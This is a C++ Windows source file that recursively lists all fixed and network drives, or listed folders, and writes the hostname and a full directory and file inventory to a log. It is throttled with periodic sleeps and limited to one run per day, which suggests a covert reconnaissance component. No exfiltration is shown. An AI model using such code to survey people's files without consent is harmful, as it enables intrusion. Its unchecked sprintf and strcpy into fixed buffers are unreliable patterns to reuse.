// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include "EnumFS.hpp"

#include "StdAfx.hpp"

// If ScanAll is True the function scans all the volumes (FIXED and REMOTE)
// If ScanAll is False the function scans only the directories in ScanList
BOOL GenerateEnumFS()
{
	CHAR szNowTime[20] = {};
	CHAR szLastScanTime[16] = {};
	
	g_dwScannedFile2 = 0;
	
	CHAR szScanAll[260];
	GetPrivateProfileString("ScanList", "ScanAll", "False", szScanAll, 256, g_szDNList);
	
	SYSTEMTIME lpSystemTime;
	if (_stricmp(szScanAll, "True"))
	{
		GetLocalTime(&lpSystemTime);
		sprintf(szNowTime, "%04u-%02u-%02u", lpSystemTime.wYear, lpSystemTime.wMonth, lpSystemTime.wDay);
		
		GetPrivateProfileString("EnumTime", "DateTime", g_szBlank, szLastScanTime, 16, g_szDNList);
		if (!strcmp(szNowTime, szLastScanTime))
			return FALSE;

		FILE *f = fopen(g_szEnumFS, "w");
		if (NULL == f)
			return FALSE;

		CHAR szLog[292];
		sprintf(szLog, "[Computer]\nName=%s\nPage=%u\n", g_szHostname, GetACP());
		fwrite(szLog, 1, strlen(szLog), f);
		
		sprintf(szLog, "[%s]\n", g_szHostname);
		fwrite(szLog, 1, strlen(szLog), f);
		
		CHAR szDirIndex[260];
		CHAR szDirPath[260];
		
		int nDirCount = GetPrivateProfileInt("ScanList", "dircount", 0, g_szDNList);
		for (int i = 1; i <= nDirCount; ++i)
		{
			sprintf(szDirIndex, "d%d", i);
			GetPrivateProfileString("ScanList", szDirIndex, g_szBlank, szDirPath, 256, g_szDNList);
			
			CHAR szDirLog[260];
			sprintf(szDirLog, "d%d=%s\n", i, szDirPath);
			fwrite(szDirLog, 1, strlen(szDirLog), f);
		}
		
		CHAR szDirCount[260];
		sprintf(szDirCount, "dircount=%d\n", nDirCount);
		fwrite(szDirCount, 1, strlen(szDirCount), f);
		
		for(int k = 1; k <= nDirCount; k++)
		{
			sprintf(szDirIndex, "d%d", k);
			GetPrivateProfileString("ScanList", szDirIndex, g_szBlank, szDirPath, 256, g_szDNList);
			
			if (szDirPath[strlen(szDirPath) - 1] != '\\')
				sprintf(szDirPath, "%s\\", szDirPath);
			
			LogFolderContent(szDirPath, f);
			RecursiveFolderScan(szDirPath, f);
		}
		
		fclose(f);
	}
	else
	{
		RecursiveDriveScan();
	}
	
	GetLocalTime(&lpSystemTime);
	sprintf(szNowTime, "%04u-%02u-%02u", lpSystemTime.wYear, lpSystemTime.wMonth, lpSystemTime.wDay);
	
	WritePrivateProfileString("EnumTime", "DateTime", szNowTime, g_szDNList);
	WritePrivateProfileString("ScanList", "ScanAll", "False", g_szDNList);
	
	return TRUE;
}

// Retrive all the devices connected and dump the device's content recursively
void RecursiveDriveScan()
{
	int nDriveCount = 0;
	
	CHAR szLogicalDrive[260] = {};
	DWORD dwLogicalDriveLen = GetLogicalDriveStrings(260, szLogicalDrive);
	if (0 == dwLogicalDriveLen || dwLogicalDriveLen > 260)
		return;
	
	FILE *f = fopen(g_szEnumFS, "w");
	if (NULL == f)
		return;
	
	CHAR szLog[292];
	sprintf(szLog, "[Computer]\nName=%s\nPage=%u\n", g_szHostname, GetACP());
	fwrite(szLog, 1, strlen(szLog), f);
	sprintf(szLog, "[%s]\n", g_szHostname);
	fwrite(szLog, 1, strlen(szLog), f);
	
	for (LPCSTR i = szLogicalDrive; *i != NULL; i += 4)
	{
		if (GetDriveType(i) == DRIVE_FIXED || GetDriveType(i) == DRIVE_REMOTE)
		{
			CHAR szDriveLog[260];
			
			sprintf(szDriveLog, "d%d=%s\n", ++nDriveCount, i);
			fwrite(szDriveLog, 1, strlen(szDriveLog), f);
		}
	}
	
	CHAR szDirCountLog[260];
	sprintf(szDirCountLog, "dircount=%d\n", nDriveCount);
	fwrite(szDirCountLog, 1, strlen(szDirCountLog), f);
	
	for (LPCSTR k = szLogicalDrive; *k != NULL; k += 4)
	{
		if (GetDriveType(k) == DRIVE_FIXED || GetDriveType(k) == DRIVE_REMOTE)
		{
			LogFolderContent(k, f);
			RecursiveFolderScan(k, f);
		}
	}
	
	fclose(f);
}

void RecursiveFolderScan(const char *lpszRootDir, FILE *f)
{
	WIN32_FIND_DATA FindFileData;
	
	CHAR szDirPattern[260];
	sprintf(szDirPattern, "%s*.*", lpszRootDir);
	
	HANDLE hFindFile = FindFirstFile(szDirPattern, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFindFile)
		return;
	
	do
	{
		if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				CHAR szDirName[260];
				CHAR szDirPath[260];
				
				strcpy(szDirName, FindFileData.cFileName);
				sprintf(szDirPath, "%s%s\\", lpszRootDir, szDirName);
				
				LogFolderContent(szDirPath, f);
				RecursiveFolderScan(szDirPath, f);
			}
		}
	}
	while (FindNextFile(hFindFile, &FindFileData));
	
	FindClose(hFindFile);
}

void LogFolderContent(const char *lpszRootDir, FILE *f)
{
	WIN32_FIND_DATA FindFileData;
	
	int nDirCount = 0;
	int nFileCount = 0;
	
	CHAR szLegend[260];
	sprintf(szLegend, "[%s]\n", lpszRootDir);
	fwrite(szLegend, 1, strlen(szLegend), f);
	
	CHAR szDirPattern[260];
	sprintf(szDirPattern, "%s*.*", lpszRootDir);
	
	HANDLE hFindFile = FindFirstFile(szDirPattern, &FindFileData);
	if (INVALID_HANDLE_VALUE == hFindFile)
		return;
	
	do
	{
		if (_stricmp(FindFileData.cFileName, ".") && _stricmp(FindFileData.cFileName, ".."))
		{
			if (FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				CHAR szDirName[260];
				CHAR szDirLog[260];
				
				strcpy(szDirName, FindFileData.cFileName);
				sprintf(szDirLog, "d%d=%s\n", ++nDirCount, szDirName);
				
				fwrite(szDirLog, 1, strlen(szDirLog), f);
			}
			else
			{
				CHAR szFileName[260];
				CHAR szFileLog[260];
				
				strcpy(szFileName, FindFileData.cFileName);
				sprintf(szFileLog, "f%d=%s\n", ++nFileCount, szFileName);
				
				fwrite(szFileLog, 1, strlen(szFileLog), f);
			}
			
			if (++g_dwScannedFile2 >= 1000)
			{
				g_dwScannedFile2 = 0;
				Sleep(9000);
			}
		}
	}
	while (FindNextFile(hFindFile, &FindFileData));
	
	FindClose(hFindFile);
	
	CHAR szDirCount[260];
	CHAR szFileCount[260];
	
	sprintf(szDirCount, "dircount=%d\n", nDirCount);
	sprintf(szFileCount, "filecount=%d\n", nFileCount);
	
	fwrite(szDirCount, 1, strlen(szDirCount), f);
	fwrite(szFileCount, 1, strlen(szFileCount), f);
}